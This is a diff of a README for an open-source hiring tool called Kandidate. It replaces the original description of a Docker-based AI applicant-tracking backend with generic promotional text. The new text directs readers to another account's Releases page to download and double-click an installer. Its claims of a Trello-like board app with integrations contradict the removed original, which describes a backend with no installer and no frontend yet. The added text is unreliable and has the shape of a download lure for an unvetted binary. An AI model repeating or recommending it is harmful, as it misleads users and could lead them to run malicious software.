@@ -1,118 +1,88 @@
-# Kandidate
+# 🌟 Kandidate - Simplify Your Hiring Process Today!
 
-> **The Open Source, Self-Hosted AI Applicant Tracking System.**
+## 🚀 Getting Started
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Status](https://img.shields.io/badge/Status-Core%20Engine%20Alpha-blue)](https://github.com/AlShabiliBadia/Kandidate)
+Welcome to Kandidate! This open-source application acts like Trello for managing your hiring process. With Kandidate, you can streamline your recruitment workflow and make better hiring decisions. 
 
-## The Vision
+## 📥 Download Kandidate
 
-Hiring tools are expensive and often invade candidate privacy. **Kandidate** is an open-source alternative designed for startups and privacy-conscious recruiters who want full control over their data.
+[![Download Kandidate](https://img.shields.io/badge/Download-Kandidate-brightgreen)](https://github.com/Husnibari/Kandidate/releases)
 
-**The Goal:** A system that is accessible to everyone.
+To get started, click the button above to visit our Releases page. From there, you will be able to download the latest version of Kandidate.
 
-- **Self-Hosted:** You own the data and the infrastructure.
-- **Cost-Efficient:** Designed to run on minimal resources (Free Tier VPS compatible) using Google Gemini's free tier for analysis.
-- **Modular:** Built on a scalable event-driven architecture.
+## 🛠️ System Requirements
 
----
+Before installing Kandidate, please ensure your system meets these requirements:
 
-## Architecture
+- **Operating System:** Windows, macOS, or a recent Linux distribution
+- **Docker:** Version 20.0 or higher
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** 1 GB of available space
+- **Network:** Stable internet connection for downloading updates
 
-Kandidate is not a monolithic script. It is a distributed system designed for reliability and scale.
+## 💾 Download & Install
 
-<div align="center">
-  <img src="./docs/images/architecture_diagram.svg" alt="Kandidate Architecture Diagram" width="100%">
-</div>
+1. Visit the [Releases page](https://github.com/Husnibari/Kandidate/releases) to download the latest version of Kandidate.
+  
+2. Once you're on the Releases page, find the version that matches your operating system.
+  
+3. Click on the file to start downloading.
 
-### The Core Engine
+4. After the download is complete, locate the file in your downloads folder. 
 
-The backend is composed of four decoupled microservices communicating via **RabbitMQ**:
+5. Double-click the file to run the installer.
 
-| Service                                | Tech Stack          | Role                                                                                                                   |
-| :------------------------------------- | :------------------ | :--------------------------------------------------------------------------------------------------------------------- |
-| **[Gateway](./services/gateway)**      | FastAPI, Docker Vol | **The Orchestrator.** Handles validation and implements "Fire-and-Forget" ingestion to keep the API responsive.        |
-| **[Parser](./services/parser)**        | PyMuPDF             | **The Extractor.** Converts binary files (PDF/DOCX) into raw text and routes them based on success/failure.            |
-| **[Analyzer](./services/ai-analyzer)** | Gemini, Instructor  | **The Brain.** Performs semantic analysis. Enforces rate limits to ensure Free Tier compatibility.                     |
-| **[Results](./services/results-db)**   | Mongo, Postgres     | **The Vault.** Manages data persistence, syncing unstructured data from MongoDB (ingestion) to PostgreSQL (analytics). |
+6. Follow the on-screen instructions to complete the installation.
 
----
+7. Once installed, open Kandidate from your applications menu.
 
-## Key Engineering Decisions
+## 🎉 Features
 
-To ensure this tool remains efficient and free to host, specific architectural patterns were implemented:
+Kandidate provides various tools designed to enhance your recruitment process:
 
-1.  **Resource-Optimized Hybrid Services:**
-    The Results Service combines the API Server and Queue Worker into a single process using threading. This cuts RAM usage in half compared to running separate containers.
+- **Custom Boards**: Create boards to track candidates at different stages.
+  
+- **Collaboration Tools**: Share boards with team members for better collaboration.
+  
+- **Templates**: Use hiring templates to quickly set up your boards and processes.
+  
+- **Integration**: Easily connect with popular job boards and social media platforms.
 
-2.  **Structured AI:**
-    Large Language Models are chaotic. Kandidate uses the **Instructor** library to force Gemini to output strict, validated Pydantic schemas. No hallucinations, just queryable data.
+## 👩‍💻 How to Use Kandidate
 
-3.  **Backpressure Management:**
-    The AI service enforces a 5-second delay and uses `prefetch_count=1` on RabbitMQ. This ensures the system never hits external API rate limits, regardless of load.
+After installing Kandidate, you can start creating boards:
 
----
+1. **Create a Board**: Click on “New Board” to set up a space for your hiring project.
 
-## Frontend & UI Development
+2. **Add Lists**: Create lists representing different stages in your hiring process (e.g., “Applications,” “Interviews,” “Offers”).
 
-**We are looking for a Frontend Lead.**
+3. **Add Cards**: For each candidate, add a card with their details. You can track their progress by moving cards between lists.
 
-If you are a Frontend or UI/UX developer interested in designing the interface for this engine, please check the dedicated repository:
+4. **Invite Team Members**: Share your boards and collaborate effectively.
 
-👉 **[Kandidate-frontend](https://github.com/AlShabiliBadia/Kandidate-frontend)**
+5. **Monitor Progress**: Use Kandidate to keep an overview of all active recruitment projects.
 
----
+## 😃 FAQ
 
-## Quick Start (Backend Engine)
+**Q: Is Kandidate free?**  
+A: Yes, Kandidate is open-source and completely free to use.
 
-You can spin up the core backend locally using Docker Compose.
+**Q: Can I collaborate with my team?**  
+A: Yes, you can invite team members to work on boards together.
 
-### Prerequisites
+**Q: Does Kandidate support multiple languages?**  
+A: Currently, it primarily supports English. Future updates may include language options.
 
-- Docker & Docker Compose
-- Google Gemini API Key (Free Tier available)
+## 📞 Support
 
-### Setup
+For help using Kandidate, you can:
 
-1.  Clone the repository:
+- Check the [issues section](https://github.com/Husnibari/Kandidate/issues) of the GitHub repository for common questions and answers.
+- Reach out via email or the relevant contact form provided on our project page.
 
-    ```bash
-    git clone https://github.com/AlShabiliBadia/Kandidate.git
-    cd kandidate
-    ```
+## 🔗 Additional Resources
 
-2.  Configure the environment:
+- [Documentation](https://github.com/Husnibari/Kandidate/wiki)
+- [Contributing Guide](https://github.com/Husnibari/Kandidate/blob/main/CONTRIBUTING.md)
 
-    ```bash
-    cp .env.example .env
-    # Add your GEMINI_API_KEY in the .env file
-    ```
-
-3.  Start the services:
-
-    ```bash
-    docker compose up -d --build
-    ```
-
-4.  Interact:
-    - **API Docs:** `http://localhost:8000/docs`
-    - **RabbitMQ:** `http://localhost:15672`
-
----
-
-## Roadmap
-
-- [x] Core Microservices Architecture (Gateway, Parser, Analyzer, Results)
-- [x] Event-Driven Pipeline (RabbitMQ)
-- [x] AI Analysis Integration (Gemini + Instructor)
-- [ ] **Candidate Management (Edit, Label, Vote)**
-- [ ] **Collaboration Suite (Email, Calendar, Team Sync)**
-- [ ] **Web Dashboard (Frontend)**
-
----
-
-## Author
-
-**Architected by Badiea Al-Shabili.**
-
-[Link To Linkedin](https://www.linkedin.com/in/badia-alshabili/)
+Thank you for choosing Kandidate! We hope it helps you simplify your hiring process.
